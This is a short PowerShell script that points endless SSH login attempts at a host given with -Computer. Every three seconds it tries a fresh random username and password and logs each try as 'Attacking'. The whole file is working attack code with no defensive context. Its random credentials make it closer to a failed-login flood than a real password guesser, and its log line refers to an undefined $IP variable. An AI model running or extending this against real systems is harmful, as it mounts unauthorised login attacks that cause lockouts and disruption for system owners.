
param ($Computer)
$count = 1
if ($Computer) {
    while ($true)
    {
        $password = "pwd-$(Get-Random)"
        $user = "user-$(Get-Random)"
        $securedPasswd = ConvertTo-SecureString $password -AsPlainText -Force
        $credentials = New-Object System.Management.Automation.PSCredential($User, $securedPasswd)
        Write-Host "Attempt $count : Attacking $IP using username: $user and password: $password" -ForegroundColor Cyan 
        New-SSHSession -ComputerName $Computer -Credential $credentials -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        $count++
        Start-Sleep 3
        
    }
    
   
}

else {
    Write-Error 'Supply IP/DNS as a parameter to the script by using -Computer'
}